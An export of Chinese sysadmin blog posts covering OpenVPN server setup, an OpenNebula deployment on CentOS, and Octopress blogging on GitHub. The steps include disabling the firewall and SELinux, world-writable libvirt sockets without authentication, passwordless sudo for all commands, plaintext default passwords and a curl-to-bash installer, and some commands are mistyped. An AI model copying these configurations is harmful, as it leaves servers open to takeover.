sample/sample-config-files/server.conf /etc/openvpn/server.conf<br><br></div><br><div><span style="font-family: 'Microsoft Yahei';">生成证书</span></div><br><div><span style="font-family: 'Microsoft Yahei';">cd /etc/openvpn/easy-rsa/2.0</span></div><br><div><span style="font-family: 'Microsoft Yahei';">. vars</span></div><br><div><span style="font-family: 'Microsoft Yahei';">./clean-all</span></div><br><div><span style="font-family: 'Microsoft Yahei';">./build-ca</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">创建vpn server的key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">./build-key-server server</span></div><br><div><span style="font-family: 'Microsoft Yahei';">创建用户秘钥</span></div><br><div><span style="font-family: 'Microsoft Yahei';">./build-key geekwolf</span></div><br><div><span style="font-family: 'Microsoft Yahei';">创建Diffie Hellman，用于增强安全性</span></div><br><div><span style="font-family: 'Microsoft Yahei';">./build-dh</span></div><br><div><span style="font-family: 'Microsoft Yahei';">默认情况所创建的文件会生成在/etc/openvpn/easy-rsa/2.0/keys目录下</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><strong><span style="font-family: 'Microsoft Yahei';">配置server.conf文件</span></strong></div><br><div><span style="font-family: 'Microsoft Yahei';"><strong>方法1:</strong>采用秘钥认证</span></div><br><div><span style="font-family: 'Microsoft Yahei';">local 120.3.243.54 </span></div><br><div><span style="font-family: 'Microsoft Yahei';">port 9001</span></div><br><div><span style="font-family: 'Microsoft Yahei';">proto tcp</span></div><br><div><span style="font-family: 'Microsoft Yahei';">dev tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">ca /etc/openvpn/easy-rsa/2.0/keys/ca.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">cert /etc/openvpn/easy-rsa/2.0/keys/server.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">key /etc/openvpn/easy-rsa/2.0/keys/server.key # This file should be kept secret</span></div><br><div><span style="font-family: 'Microsoft Yahei';">dh /etc/openvpn/easy-rsa/2.0/keys/dh1024.pem</span></div><br><div><span style="font-family: 'Microsoft Yahei';">server 10.8.0.0 255.255.255.0</span></div><br><div><span style="font-family: 'Microsoft Yahei';">ifconfig-pool-persist ipp.txt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">push “route 192.168.0.0 255.255.0.0”</span></div><br><div><span style="font-family: 'Microsoft Yahei';">push “route 10</span><span style="font-family: 'Microsoft Yahei';">4</span><span style="font-family: 'Microsoft Yahei';">.</span><span style="font-family: 'Microsoft Yahei';">172.0.0 255.255.0.0”</span></div><br><div><span style="font-family: 'Microsoft Yahei';">keepalive 10 120</span></div><br><div><span style="font-family: 'Microsoft Yahei';">comp-lzo</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">status openvpn-status.log</span></div><br><div><span style="font-family: 'Microsoft Yahei';">verb 3</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';"><strong>方法2：</strong>采用用户密码认证</span></div><br><div><span style="font-family: 'Microsoft Yahei';">A.额外在上面配置文件后面添加[基于PAM身份认证]</span></div><br><div><span style="font-family: 'Microsoft Yahei';">plugin /usr/lib/openvpn/openvpn-auth-pam.so login</span></div><br><div><span style="font-family: 'Microsoft Yahei';">client-cert-not-required</span></div><br><div><span style="font-family: 'Microsoft Yahei';">username-as-common-name</span></div><br><div><span style="font-family: 'Microsoft Yahei';">服务端本地创建用户</span></div><br><div><span style="font-family: 'Microsoft Yahei';">useradd -s /sbin/nologin geekwolf</span></div><br><div><span style="font-family: 'Microsoft Yahei';">passwd geekwolf </span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">B.额外在上面配置文件后面添加[基于脚本的身份认证]</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">auth-user-pass-verify /usr/local/openvpn/etc/checkpsw.sh via-env</span></div><br><div><span style="font-family: 'Microsoft Yahei';">client-cert-not-required</span></div><br><div><span style="font-family: 'Microsoft Yahei';">username-as-common-name</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">wget <a href="http://openvpn.se/files/other/checkpsw.sh" target="_blank" rel="external">http://openvpn.se/files/other/checkpsw.sh</a> -O /usr/local/openvpn/etc/checkpsw.sh</span></div><br><div><span style="font-family: 'Microsoft Yahei';">chmod +x checkpsw.sh</span></div><br><div><span style="font-family: 'Microsoft Yahei';">修改脚本PASSFILE和LOG_FILE参数文件位置</span></div><br><div><span style="font-family: 'Microsoft Yahei';">PASSFILE=/etc/openvpn/etc/psw-file</span></div><br><div><span style="font-family: 'Microsoft Yahei';">LOG_FILE=/etc/openvpn/etc/openvpn-password.log</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">用户名和密码文件格式：</span></div><br><div><span style="font-family: 'Microsoft Yahei';">/etc/openvpn/etc/psw-file(用户和密码之间用空格或者tab隔开)</span></div><br><div><span style="font-family: 'Microsoft Yahei';">geekwolf geekwolf</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';"><strong>Windows 7 客户端配置</strong></span></div><br><div><span style="font-family: 'Microsoft Yahei';">下载 <span style="color: #5566dd;"><a href="http://swupdate.openvpn.org/community/releases/openvpn-install-2.3.2-I001-x86_64.exe" target="_blank" rel="external">http://swupdate.openvpn.org/community/releases/openvpn-install-2.3.2-I001-x86_64.exe</a>（或者</span></span>OpenVPN Client官网下载）</div><br><div><span style="font-family: 'Microsoft Yahei';">安装后桌面会生成<img src="file:///C:/Users/20130416/AppData/Local/YNote/Data/geekwolf%40163.com/2c01bb4baab24e9f990a595cf3f1325f/clipboard.png" alt="">，属性设置<img src="file:///C:/Users/20130416/AppData/Local/YNote/Data/geekwolf%40163.com/a8aa7d6809e64962a367e17f3847ff40/clipboard.png" alt=""></span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">A.若采用秘钥方式认证</span></div><br><div><span style="font-family: 'Microsoft Yahei';">客户端做一下事情：</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> 拷贝服务端ca.crt  用户秘钥geekwolf.crt geekwolf.key 到OpenVpn客户端安装根目录下下的config目录内</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> 增加客户端配置文件client.ovpn：</span></div><br><div><span style="font-family: 'Microsoft Yahei';">client</span></div><br><div><span style="font-family: 'Microsoft Yahei';">dev tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">proto tcp</span></div><br><div><span style="font-family: 'Microsoft Yahei';">remote 120.3.243.54 9001</span></div><br><div><span style="font-family: 'Microsoft Yahei';">resolv-retry infinite</span></div><br><div><span style="font-family: 'Microsoft Yahei';">nobind</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">ca ca.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">cert geekwolf.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">key geekwolf.key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">comp-lzo</span></div><br><div><span style="font-family: 'Microsoft Yahei';">verb 3</span></div><br><div><span style="font-family: 'Microsoft Yahei';">最后以管理员身份运行OpenVPN GUI程序，即可连接使用vpn</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">A.若采用用户密码认证（pam认证）</span></div><br><div><span style="font-family: 'Microsoft Yahei';">注释掉用户cert和keys，配置文件增加密码询问auth-user-pass</span></div><br><div><span style="font-family: 'Microsoft Yahei';">既：</span></div><br><div><br><div><span style="font-family: 'Microsoft Yahei';">client</span></div><br><div><span style="font-family: 'Microsoft Yahei';">dev tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">proto tcp</span></div><br><div><span style="font-family: 'Microsoft Yahei';">remote 120.3.243.54 9001</span></div><br><div><span style="font-family: 'Microsoft Yahei';">resolv-retry infinite</span></div><br><div><span style="font-family: 'Microsoft Yahei';">nobind</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">persist-tun</span></div><br><div><span style="font-family: 'Microsoft Yahei';">ca ca.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">；cert geekwolf.crt</span></div><br><div><span style="font-family: 'Microsoft Yahei';">；key geekwolf.key</span></div><br><div><span style="font-family: 'Microsoft Yahei';">comp-lzo</span></div><br><div><span style="font-family: 'Microsoft Yahei';">verb 3 </span></div><br></div><br><div><span style="font-family: 'Microsoft Yahei';">auth-user-pass</span></div><br><div><span style="font-family: 'Microsoft Yahei';">（免输入账号密码方法：auth-user-pass passwd.txt）</span></div><br><div><span style="font-family: 'Microsoft Yahei';">passwd.txt 格式</span></div><br><div><span style="font-family: 'Microsoft Yahei';">账号</span></div><br><div><span style="font-family: 'Microsoft Yahei';">密码</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><strong><span style="font-family: 'Microsoft Yahei';">防火墙配置</span></strong></div><br><div><span style="font-family: 'Microsoft Yahei';">可参考源码下的配置：</span></div><br><div><span style="font-family: 'Microsoft Yahei';">sample/sample-config-files/firewall.sh</span></div><br><div><span style="font-family: 'Microsoft Yahei';">本测试的规则为：</span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A INPUT -i tun+ -j ACCEPT</span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A FORWARD -i tun+ -o eth1 -j ACCEPT</span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A FORWARD -i eth1 -o tun+ -j ACCEPT</span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A OUTPUT -o tun+ -j ACCEPT </span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A POSTROUTING -s 10.8.0.0/24 -o eth1 -j MASQUERADE</span></div><br><div><span style="font-family: 'Microsoft Yahei';">-A POSTROUTING -d 104.172.0.0/255.255.255.0     -o eth0 -j MASQUERADE</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';"><strong>通过以上配置实现了：</strong></span></div><br><div><span style="font-family: 'Microsoft Yahei';">访问公司内网192.168.0.0 走vpn的eth1出口，访问104.172.0.0等走vpn的eth0出口，访问其他地址均走客户端本地</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><strong> </strong></div><br><div><span style="font-family: 'Microsoft Yahei';"><strong>参考资料：</strong></span></div><br><div><header><br><div><span style="font-family: 'Microsoft Yahei';">深入OpenVPN的配置 </span></div><br><div><span style="font-family: 'Microsoft Yahei';"><a href="http://www.linuxfly.org/post/86/" target="_blank" rel="external">http://www.linuxfly.org/post/86/</a></span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br></header></div>]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openvpn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos 6.4 下 部署OpenNebula4.4]]></title>
      <url>/2013/12/14/centos-6-4-e4-b8-8b-e9-83-a8-e7-bd-b2opennebula4-4.html</url>
      <content type="html"><![CDATA[<p><strong>安装部署</strong><br><strong>1.环境说明</strong><br>Front:192.168.10.101 Centos6.4 x 64 NF5120<br>Node1:192.168.10.102 Centos6.4 x 64 NF5120<br><strong>2.部署OpenNebula4.4</strong><br>下载相应版本 <a href="http://www.opennebula.org/software:software#from_official_repository_of_linux_distributions" target="_blank" rel="external">http://www.opennebula.org/software:software#from_official_repository_of_linux_distributions</a><br>CentOS-6-opennebula-4.4.0-1<br>安装Epel源<br>rpm -ivh <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm" target="_blank" rel="external">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</a><br>cd opennebula-4.4.0-1<br>yum -y localinstall *.rpm<br>Front控制器在此也作为节点使用，在计算节点上安装 kvm 和 opennebula-node-kvm：</p>
<p>yum localinstall opennebula-node-kvm-4.0.0-1.x86_64.rpm<br>yum install qemu-kvm qemu-kvm-tools libvirt<br>/etc/init.d/libvirtd start</p>
<p>以上OpenNebula的控制节点和计算节点所需软件包均以安装完，下面进行简单的配置( 事先关闭iptables和selinux，后续讲如何加固)<br>a. 更改Opennebula的front，即OpenNebula-sunstone服务的监听地址<br>sed -i ‘s#127.0.0.1#192.168.10.101#g’ /etc/one/sunstone-server.conf<br>b. 默认会生成用户名和随机密码<br>cat /var/lib/one/.one/one_auth<br>oneadmin:6696d237e58221ae1eb39fdf3a01335f<br>访问<a href="http://192.168.10.101:9869" target="_blank" rel="external">http://192.168.10.101:9869</a> 输入账号密码<br>c. 更改opennebula数据存储方式为mysql<br>vim /etc/one/oned.conf<br>修改仓库路径：<br>DATASTORE_BASE_PATH = /data/datastoress(注意目录权限为oneadmin)<br>注释DB = [ backend = “sqlite” ]<br>打开注释：<br>DB = [ backend = “mysql”,<br>server = “localhost”,<br>port = 0,<br>user = “oneadmin”,<br>passwd = “oneadmin”,<br>db_name = “opennebula” ]<br>（相关授权略）<br>d. 添加环境变量<br>export ONE_XMLRPC=<a href="http://localhost:2633/RPC2" target="_blank" rel="external">http://localhost:2633/RPC2</a><br>export ONE_AUTH=$HOME/.one/one_auth<br>export PATH=$ONE_LOCATION/bin:$PATH<br>e. 为初次部署方便暂使用网络桥接模式<br>母机桥接配置：<br>ifcfg-eth0:</p>
<p>DEVICE=eth0<br>TYPE=Ethernet<br>UUID=200f14a6-c347-4d4a-9564-257ccf4ebe8a<br>ONBOOT=yes<br>NM_CONTROLLED=yes<br>BOOTPROTO=none<br>HWADDR=00:E0:81:DE:6C:CA<br>BRIDGE=”br0”</p>
<p>ifcfg-br0:<br>DEVICE=”br0”<br>TYPE=”Bridge”<br>BOOTPROTO=”static”<br>ONBOOT=”yes”<br>IPADDR=192.168.10.102<br>NETMASK=255.255.240.0<br>DNS1=114.114.114.114<br>brctl show 可查询现有桥接的网络<br>bridge name bridge id STP enabled interfaces<br>br0 8000.00e081de6cca no eth0<br>重启网卡</p>
<p>f. 确定计算节点权限（Front安装时会自动配置）<br>/etc/libvirt/qemu.conf<br>user = “oneadmin”<br>group = “oneadmin”<br>dynamic_ownership = 0</p>
<p>/etc/libvirt/libvirtd.conf<br>listen_tcp = 1<br>listen_tls = 0<br>mdns_adv = 0<br>unix_sock_group = “oneadmin”<br>unix_sock_ro_perms = “0777”<br>unix_sock_rw_perms = “0777”<br>auth_unix_ro = “none”<br>auth_unix_rw = “none”</p>
<p>/etc/sysconfig/libvirtd(修改监听地址)<br>LIBVIRTD_ARGS=”–listen”</p>
<p>/etc/sudoers<br>添加oneadmin ALL=(root)NOPASSWD:ALL<br>注释#Defaults requiretty</p>
<p>ln -s /usr/libexec/qemu-kvm /usr/bin/kvm<br>将Front的oneadmin的公钥拷贝到计算节点oneadmin下实现无密码认证</p>
<p>g .以上OpenNebula的部署已经完成，下面启动服务器进行简单操作<br>service OpenNebula start<br>service OpenNebula-sunstone start</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/12/s2.jpg"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/12/s2-1024x573.jpg" alt="s"></a></p>
<p>下篇预告：</p>
<p>  关于OpenNebula镜像压缩传输及本地镜像缓存</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> opennebula部署 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用Octopress在github上写博客]]></title>
      <url>/2013/12/11/e7-94-a8octopress-e5-9c-a8github-e4-b8-8a-e5-86-99-e5-8d-9a-e5-ae-a2.html</url>
      <content type="html"><![CDATA[<p><strong>1.安装git及依赖</strong><br>yum -y install git<br>yum -y install gcc-c++ patch readline readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel make bzip2 autoconf automake libtool bison iconv-devel</p>
<p><strong>2.安装rvm</strong><br>otopress官方要求用ruby 1.9.3，ruby可以通过rbenv或者RVM（Ruby版本管理，Ruby Version Manager）来安装。安装RVM也是有讲究的，分为单用户安装和多用户安装，建议用单用户安装，即直接在用户权限下进行，所以要注意下~/下面的文件夹是否有w权限；若要多用户安装，则在命令前加sudo，不要在root下直接进行安装。<br>安装前要有编译软件如gcc，如果这一步一直有error的话，不妨先安装gcc。</p>
<p>curl -L <a href="https://get.rvm.io" target="_blank" rel="external">https://get.rvm.io</a> | bash -s stable –ruby</p>
<p>#<span style="font-family: 宋体;">如果</span><span style="font-family: Consolas;">curl</span><span style="font-family: 宋体;">报错的话就先</span><span style="font-family: Consolas;">install curl</span><br>然后在<span style="font-family: Consolas;">~/.bashrc</span><span style="font-family: 宋体;">文件后面添加下列语句：</span><br>[[ -s “$HOME/.rvm/scripts/rvm” ]] &amp;&amp; source “$HOME/.rvm/scripts/rvm”</p>
<h1 id="RVM-bash-completion"><a href="#RVM-bash-completion" class="headerlink" title="RVM bash completion"></a>RVM bash completion</h1><p>[[ -r “$HOME/.rvm/scripts/completion” ]] &amp;&amp; source “$HOME/.rvm/scripts/completion”<br>之后在当前<span style="font-family: Arial;">shell</span><span style="font-family: 宋体;">中载入</span><span style="font-family: Arial;">rvm</span><span style="font-family: 宋体;">环境：</span><br>source ~/.bashrc<br>也可以重新打开一个<span style="font-family: Arial;">shell</span><span style="font-family: 宋体;">，就自动载入了</span></p>
<p><strong>检查:</strong><br>type rvm | head -n1</p>
<p>#<span style="font-family: 宋体;">若返回</span><span style="font-family: Consolas;">$ rvm is a function</span><span style="font-family: 宋体;">则说明安装成功，否则检查一下前面步骤有没有报错，权限、载入与否等</span><br>rvm notes</p>
<p>#<span style="font-family: 宋体;">检查</span><span style="font-family: Consolas;">rvm</span><span style="font-family: 宋体;">函数是否工作</span><br>rvm requiments</p>
<p>#<span style="font-family: 宋体;">查看其他依赖并从源中安装，这时终端中会出现下列信息</span><br>Additional Dependencies:</p>
<h1 id="For-Ruby-Ruby-HEAD-MRI-Rubinius-amp-REE-install-the-following"><a href="#For-Ruby-Ruby-HEAD-MRI-Rubinius-amp-REE-install-the-following" class="headerlink" title="For Ruby / Ruby HEAD (MRI, Rubinius, &amp; REE), install the following:"></a>For Ruby / Ruby HEAD (MRI, Rubinius, &amp; REE), install the following:</h1><p>ruby: yum install -y gcc-c++ patch readline readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel make bzip2 autoconf automake libtool bison iconv-devel</p>
<h2 id="NOTE-For-centos-gt-5-4-iconv-devel-is-provided-by-glibc"><a href="#NOTE-For-centos-gt-5-4-iconv-devel-is-provided-by-glibc" class="headerlink" title="NOTE: For centos &gt;= 5.4 iconv-devel is provided by glibc"></a>NOTE: For centos &gt;= 5.4 iconv-devel is provided by glibc</h2><p>注释：将<span style="font-family: Arial;">yum</span><span style="font-family: 宋体;">那一段复制，在另一个终端中执行即可安装。不同电脑所需要的依赖也不同。</span><br>在<span style="font-family: Arial;">Ruby</span><span style="font-family: 宋体;">中文社区的</span><span style="font-family: Arial;">wiki</span><span style="font-family: 宋体;">文档里面有一句单独安装</span><span style="font-family: Arial;">readline</span><span style="font-family: 宋体;">的命令，这里已经包括了</span></p>
<p><strong>3.安装Ruby环境</strong></p>
<p>rvm list known<br>rvm install 1.9.3<br>rvm use 1.9.3 –default(<span style="font-family: 宋体;">设置默认</span><span style="font-family: Consolas;">)</span><br>rvm list</p>
<p>#<span style="font-family: 宋体;">查看安装的</span><span style="font-family: Consolas;">rubies</span><br>rvm [-v] [–version]</p>
<p>#<span style="font-family: 宋体;">查看版本</span><br>rvm remove &lt;ruby_version&gt;</p>
<p>#<span style="font-family: 宋体;">卸载一个版本</span></p>
<p><strong>4.设置Octopress</strong></p>
<p>结构：</p>
<p>1 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/.rvmrc" target="_blank" rel="external">.rvmrc</a><br>改成使用我机子上装的Ruby版本（1.9.3），Octopress最低要求是1.9.2。<br>2 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/Gemfile" target="_blank" rel="external">Gemfile</a><br>把源改成ruby.taobao.org，去掉部分gem的版本号限制，咱都用最新的。<br>3 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/Rakefile" target="_blank" rel="external">Rakefile</a><br>用haml替换markdown（这个根据自己喜好来，只要是被支持的），时间改成东八区的，降低主题对custom目录的依赖。<br>4 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/_config.yml" target="_blank" rel="external">_config.yml</a><br>这里都是一些定制化的配置信息，比如日期格式、永久链接、新浪微博等。<br>5 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/plugins/sh_js.rb" target="_blank" rel="external">plugins/sh_js.rb</a><br>[新增] 代码高亮插件，具体介绍看：<a href="http://mrzhang.me/blog/using-shjs-for-jekyll.html" target="_blank" rel="external">Using SHJS for Jekyll</a><br>6 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/plugins/tag_generator.rb" target="_blank" rel="external">plugins/tag_generator.rb</a><br>[新增] 其实Jekyll是支持Tag的，只不过Octopress目前没有官方插件支持，所以我自己搞了个，支持中文。<br>7 <a href="https://github.com/jsw0528/octopress/blob/mrzhang_me/.themes/blog/" target="_blank" rel="external">.themes/blog/</a></p>
<p>到准备好的目录下，先把<span style="font-family: Consolas;">Octopress</span><span style="font-family: 宋体;">从仓库里</span><span style="font-family: Consolas;">clone</span><span style="font-family: 宋体;">下来</span></p>
<p>git clone git://github.com/imathis/octopress.git octopress<br>cd octopress</p>
<p>#<span style="font-family: 宋体;">如果使用的是</span><span style="font-family: Consolas;">RVM</span><span style="font-family: 宋体;">，这一步会被讯网你是否相信</span><span style="font-family: Consolas;">.rvmrc</span><span style="font-family: 宋体;">，选择</span><span style="font-family: Consolas;">yes</span><br>gem install bundler<br>bundle install</p>
<p>#<span style="font-family: 宋体;">安装依赖</span><br>rake install[‘Theme Name’]</p>
<p>#<span style="font-family: 宋体;">安装主题，无参数则是默认主题</span><br>【参考：<a href="http://www.360doc.com/content/12/0421/21/1016783_205514919.shtml" target="_blank" rel="external">http://www.360doc.com/content/12/0421/21/1016783_205514919.shtml</a>】</p>
<p>通过octopress/_config.yml修改博客设置，诸如博客标题，插件，以及<span style="font-family: Arial;">url</span><span style="font-family: 宋体;">格式等，这个很重要，稍后会说。</span></p>
<p>然后登录<span style="font-family: Arial;">GitHub</span><span style="font-family: 宋体;">并注册一个帐号</span>,创建一个<span style="font-family: Arial;">repository</span><span style="font-family: 宋体;">，这里有两种方式：</span></p>
<p>1.<span style="font-family: 宋体;">用</span><span style="font-family: Arial;">GitHub</span><span style="font-family: 宋体;">的用户</span><span style="font-family: Arial;">/</span><span style="font-family: 宋体;">组织页面（</span><span style="font-family: Arial;">Github User/Organization pages</span><span style="font-family: 宋体;">）。这样的话</span><span style="font-family: Arial;">repository</span><span style="font-family: 宋体;">需命名为</span><span style="font-family: Arial;">user.github.com</span><span style="font-family: 宋体;">，这样的页面只能有一个。可通过</span><span style="font-family: Arial;"><a href="http://username.github.com" target="_blank" rel="external">http://username.github.com</a></span><span style="font-family: 宋体;">来访问。</span><br>2.<span style="font-family: 宋体;">用</span><span style="font-family: Arial;">GitHub</span><span style="font-family: 宋体;">的项目页面（</span><span style="font-family: Arial;">Github projects pages</span><span style="font-family: 宋体;">）。</span><span style="font-family: Arial;">repository</span><span style="font-family: 宋体;">可任意命名，这样的页面可拥有多个。通过</span><span style="font-family: Arial;"><a href="http://username.github.com/repo_name" target="_blank" rel="external">http://username.github.com/repo_name</a></span><span style="font-family: 宋体;">来访问，</span><span style="font-family: Arial;">Github</span><span style="font-family: 宋体;">会寻找项目中</span><span style="font-family: Arial;">gh-pages</span><span style="font-family: 宋体;">分支，并且在浏览器中显示出其中的网页内容。所以我选择了第二种</span></p>
<p>下面采用第一种方式：</p>
<p>在<span style="font-family: Arial;">github</span><span style="font-family: 宋体;">创建</span><span style="font-family: Arial;">geekwolf.github.io</span><span style="font-family: 宋体;">库（暂不要自动生成网页）</span></p>
<p>cd octopress<br>rake setup_github_pages<br>输入<span style="font-family: Consolas;">geekwolf.github.io</span><span style="font-family: 宋体;">的</span><span style="font-family: Consolas;">ssh</span><span style="font-family: 宋体;">链接地址：</span><span style="font-family: Consolas;">git@github.com:geekwolf/geekwolf.github.io.git</span></p>
<p>rake generate</p>
<p>#<span style="font-family: 宋体;">产生静态文件，将文件从</span><span style="font-family: Consolas;">source/</span><span style="font-family: 宋体;">复制到</span><span style="font-family: Consolas;">public/</span></p>
<p>rake preview</p>
<p>#<span style="font-family: 宋体;">本地预览，地址栏输入</span><span style="font-family: Consolas;">localhost:4000/repo_name</span></p>
<p>rake deploy</p>
<p>#<span style="font-family: 宋体;">将文件从</span><span style="font-family: Consolas;">public/</span><span style="font-family: 宋体;">复制到</span><span style="font-family: Consolas;">_deploy/</span><span style="font-family: 宋体;">，再从</span><span style="font-family: Consolas;">_deploy/</span><span style="font-family: 宋体;">中推送到远端仓库（默认远端</span><span style="font-family: Consolas;">master</span><span style="font-family: 宋体;">分支），需要</span><span style="font-family: Consolas;">ssh publickey</span></p>
<p>下面将<span style="font-family: Consolas;">octopress</span><span style="font-family: 宋体;">源文件传送到远端</span><span style="font-family: Consolas;">source</span><span style="font-family: 宋体;">分支</span></p>
<p>git remote add origin git@github.com:geekwolf/geekwolf.github.io.git</p>
<p>#<span style="font-family: 宋体;">将</span><span style="font-family: Consolas;">repository</span><span style="font-family: 宋体;">设置为默认的远端仓库</span><br>git config branch.master.remote origin</p>
<p>#<span style="font-family: 宋体;">将</span><span style="font-family: Consolas;">master</span><span style="font-family: 宋体;">分支和</span><span style="font-family: Consolas;">origin</span><span style="font-family: 宋体;">远端仓库对应</span><br>git branch -m master source</p>
<p>#rename branch<br>git add .<br>git commit -m ‘blog source’<br>git push origin source</p>
<p>以上完成后，每次博客更改过通过<span style="font-family: Consolas;">rake generate </span><span style="font-family: 宋体;">生成静态页面</span><span style="font-family: Consolas;">,</span><span style="font-family: 宋体;">然后通过</span><span style="font-family: Consolas;">rake deploy</span><span style="font-family: 宋体;">发布到远端</span><span style="font-family: Consolas;">master</span><span style="font-family: 宋体;">分支，从而发布网站</span></p>
<p><strong>  5.绑定域名</strong></p>
<p><strong> </strong>echo “linuxhonker.com”&gt;&gt; oectopress/source/CNAME<br>修改A记录为207.97.227.245</p>
<p><strong>6.新机器使用方法</strong></p>
<p>克隆远端source分支到本地octopress目录<br>git clone -b source git@github.com:geekwolf.github.io.git octopress<br>克隆远端master分支到octopress下的_deploy目录<br>cd  octopress<br>git clone -b git@github.com:geekwolf.github.io.git _deploy</p>
<p>然后继续<br>gem install bundler<br>bundle install<br>rake setup_github_pages<br>rake generate<br>git add .<br>git commit -am “some comment here”<br>git push origin source (update the remote source branch)<br>rake deploy(update the remote master branch)</p>
<p><strong>参考：</strong><br>Windows下部署方式：<br><a href="http://www.freehao123.com/octopress/" target="_blank" rel="external">http://www.freehao123.com/octopress/</a><br>Octopress定制：<br><a href="http://biaobiaoqi.me/blog/2013/07/10/decorate-octopress/" target="_blank" rel="external">http://biaobiaoqi.me/blog/2013/07/10/decorate-octopress/</a><br><a href="http://octopress.org/docs/blogging/" target="_blank" rel="external">http://octopress.org/docs/blogging/</a><br><a href="http://octopress.org/docs/configuring/" target="_blank" rel="external">http://octopress.org/docs/configuring/</a><br>其他参考：<br><a href="http://blog.zerosharp.com/clone-your-octopress-to-blog-from-two-places/" target="_blank" rel="external">http://blog.zerosharp.com/clone-your-octopress-to-blog-from-two-places/</a><br><a href="http://www.psichen.com/octopress-static-blog" target="_blank" rel="external">http://www.psichen.com/octopress-static-blog</a><br>Git提交本地分支到远程分支操作<br><a href="http://www.cnblogs.com/springbarley/archive/2012/11/03/2752984.html" target="_blank" rel="external">http://www.cnblogs.com/springbarley/archive/2012/11/03/2752984.html</a><br>Vim markdown插件<br><a href="http://whbzju.github.io/blog/2013/02/02/octopress-peizhi/" target="_blank" rel="external">http://whbzju.github.io/blog/2013/02/02/octopress-peizhi/</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> github </tag>
            
            <tag> octopress </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OpenStack Hacker养成指南]]></title>
      <url>/2013/11/28/openstack-hacker-e5-85-bb-e6-88-90-e6-8c-87-e5-8d-97.html</url>
      <content type="html"><![CDATA[<h1 id="0-阅读指南"><a href="#0-阅读指南" class="headerlink" title="0 阅读指南"></a>0 阅读指南</h1><ul>
<li>希望本文能够解开你心中萦绕已久的心结，假如是死结，请移步到 <a href="https://wiki.openstack.org/wiki/Main_Page" title="https://wiki.openstack.org/wiki/Main_Page" target="_blank" rel="external">https://wiki.openstack.org/wiki/Main_Page</a></li>
<li>学习OpenStack其实就是学习各种Python库的过程。</li>
<li>把OpenStack的设计原则贴在你的墙上。 <a href="https://wiki.openstack.org/wiki/BasicDesignTenets" title="https://wiki.openstack.org/wiki/BasicDesignTenets" target="_blank" rel="external">https://wiki.openstack.org/wiki/BasicDesignTenets</a></li>
</ul>
